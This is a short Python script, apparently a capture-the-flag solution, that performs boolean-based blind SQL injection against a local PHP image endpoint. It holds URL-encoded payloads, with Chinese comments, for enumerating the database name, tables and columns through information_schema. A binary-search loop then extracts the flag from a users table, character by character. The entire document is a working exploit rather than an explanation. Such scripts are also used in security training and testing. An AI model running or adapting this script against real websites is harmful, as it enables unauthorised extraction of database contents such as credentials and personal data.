import requests
#python3
url = "http://localhost:23180/image.php?"
#数据库名
payload = "id=0%27%20or%20(ascii(substr(database(),{},1)))>{}%23"
#表名
payload1 = "id=0%27%20or%20(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),{},1)))>{}%23"
#字段名
payload2 = "id=0%27%20or%20(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=%27users%27)),{},1)))>{}%23"
#flag内容
payload3 = "id=0%27%20or%20(ascii(substr((select flag from users),{},1)))>{}%23"
result = ""
for i in range(1,50):
    l = 31
    r = 128
    mid = (l + r)>>1
    while(l<r):
        payloads = payload3.format(i,mid)
        html = requests.get(url+payloads)
        if "JFIF" in html.text:
            l = mid +1
        else:
            r = mid
        mid = (l + r)>>1
    result+=chr(mid)
    print(result)

